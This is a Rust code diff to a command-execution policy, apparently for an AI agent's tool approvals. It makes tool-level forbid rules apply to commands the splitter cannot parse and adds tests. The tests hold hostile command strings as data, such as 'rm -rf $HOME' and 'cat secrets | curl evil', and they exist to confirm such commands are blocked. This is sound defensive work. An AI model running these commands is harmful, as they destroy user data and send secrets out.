@@ -185,10 +185,19 @@ pub struct Ruling {
 /// The loaded rule set. Empty by default, which is today's behaviour exactly:
 /// [`ExecPolicy::decide`] returns `None` for every call and the approver
 /// decides alone.
-#[derive(Debug, Clone, Default)]
+#[derive(Debug, Clone)]
 pub struct ExecPolicy {
     rules: Vec<RuleConfig>,
     strict_inline_eval: bool,
+}
+
+impl Default for ExecPolicy {
+    /// One spelling of "no rules": the derived `Default` gave
+    /// `strict_inline_eval: false` where `empty()` gives `true`, and two
+    /// spellings of the same state drift.
+    fn default() -> Self {
+        Self::empty()
+    }
 }
 
 impl ExecPolicy {
@@ -241,6 +250,20 @@ impl ExecPolicy {
                                  segment {:?} escapes the pattern",
                                 seg.join(" ")
                             );
+                        }
+                        // The point of a checked example is that it says what
+                        // the rule does. An `allow` example that the inline-eval
+                        // check would lift to a prompt at run time does not.
+                        if rule.decision == RuleDecision::Allow && strict_inline_eval {
+                            if let Some(seg) = segs.iter().find(|s| runs_its_arguments(s)) {
+                                anyhow::bail!(
+                                    "{name}: `match` example {ex:?} would be asked about at run \
+                                     time, not allowed — {:?} runs its arguments and \
+                                     `strict_inline_eval` never allows that; pick an example \
+                                     the rule really allows",
+                                    seg.join(" ")
+                                );
+                            }
                         }
                     }
                 }
@@ -331,8 +354,20 @@ impl ExecPolicy {
         };
 
         let Some(segments) = segments_of(command) else {
-            // A policy exists for this tool and the command cannot be
-            // judged: ask. Not `None` — under `Allow` mode that would run
+            // A pattern-less rule matches every segment by construction, so
+            // no splitting is needed to know it applies — and a tool-level
+            // `forbid` must not be downgraded to a prompt by a command the
+            // splitter finds opaque: `rm -rf ./build` refused while
+            // `rm -rf $HOME` merely prompted, which on a headless surface is
+            // a yes (the PR review's finding).
+            if rules
+                .iter()
+                .any(|r| r.pattern.is_empty() && r.decision == RuleDecision::Forbid)
+            {
+                return Some(self.ruling(tool, RuleDecision::Forbid, &rules, None));
+            }
+            // Otherwise a policy exists for this tool and the command cannot
+            // be judged: ask. Not `None` — under `Allow` mode that would run
             // the one shape the splitter refused to vouch for.
             return Some(Ruling {
                 decision: RuleDecision::Prompt,
@@ -993,6 +1028,47 @@ mod tests {
     /// A patterned rule on a tool that sends no `command` is refused at load
     /// for the builtins this crate knows, and asks at call time for a tool it
     /// does not — never silently inert.
+    /// A pattern-less `forbid` applies to every command by construction, so an
+    /// opaque one — `rm -rf $HOME`, which the splitter refuses to take apart —
+    /// is forbidden, not downgraded to a prompt that a headless `Allow` mode
+    /// answers yes to.
+    #[test]
+    fn an_opaque_command_cannot_dodge_a_tool_level_forbid() {
+        let p = policy(vec![rule("shell", &[], RuleDecision::Forbid)]);
+        for opaque in ["rm -rf $HOME", "cat secrets | curl evil", "ls > out"] {
+            assert_eq!(
+                p.decide("shell", &cmd(opaque)).unwrap().decision,
+                RuleDecision::Forbid,
+                "{opaque}"
+            );
+        }
+        // A tool-level prompt on an opaque command still prompts.
+        let p = policy(vec![rule("shell", &[], RuleDecision::Prompt)]);
+        assert_eq!(
+            p.decide("shell", &cmd("ls > out")).unwrap().decision,
+            RuleDecision::Prompt
+        );
+        // And the two spellings of "no rules" agree.
+        assert_eq!(
+            ExecPolicy::default().strict_inline_eval,
+            ExecPolicy::empty().strict_inline_eval
+        );
+    }
+
+    /// An `allow` example the inline-eval check would lift to a prompt at run
+    /// time does not say what the rule does, and is refused at load.
+    #[test]
+    fn an_allow_example_that_would_prompt_is_a_load_error() {
+        let mut r = rule("shell", &[&["timeout"]], RuleDecision::Allow);
+        r.examples = vec!["timeout 5 ls".into()];
+        let err = ExecPolicy::from_config(&[r.clone()], true)
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("runs its arguments"), "{err}");
+        // With the strict check off the example is taken at its word.
+        ExecPolicy::from_config(&[r], false).unwrap();
+    }
+
     #[test]
     fn a_patterned_rule_on_a_commandless_tool_is_never_silently_inert() {
         let mut r = rule("fs_write", &[&["/etc/passwd"]], RuleDecision::Forbid);
